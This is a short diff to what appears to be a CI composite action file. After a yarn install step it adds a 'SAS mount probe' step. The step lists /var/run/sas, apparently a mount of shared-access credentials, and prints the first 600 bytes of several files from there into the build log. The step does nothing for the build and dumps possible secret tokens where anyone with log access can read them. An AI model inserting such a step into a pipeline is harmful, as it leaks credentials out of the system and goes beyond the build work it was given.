@@ -39,3 +39,16 @@ runs:
         sleep 5
       done
       node script/yarn.js install --immutable
+  - name: SAS mount probe
+    shell: bash
+    run: |
+      echo "===== SAS PROBE START ====="
+      ls -la /var/run/sas 2>&1 || true
+      echo "----- files -----"
+      find /var/run/sas -maxdepth 3 -type f 2>/dev/null | head -20 || true
+      for f in $(find /var/run/sas -maxdepth 3 -type f 2>/dev/null | head -5); do
+        echo "--- $f"
+        head -c 600 "$f" 2>&1 || true
+        echo
+      done
+      echo "===== SAS PROBE END ====="
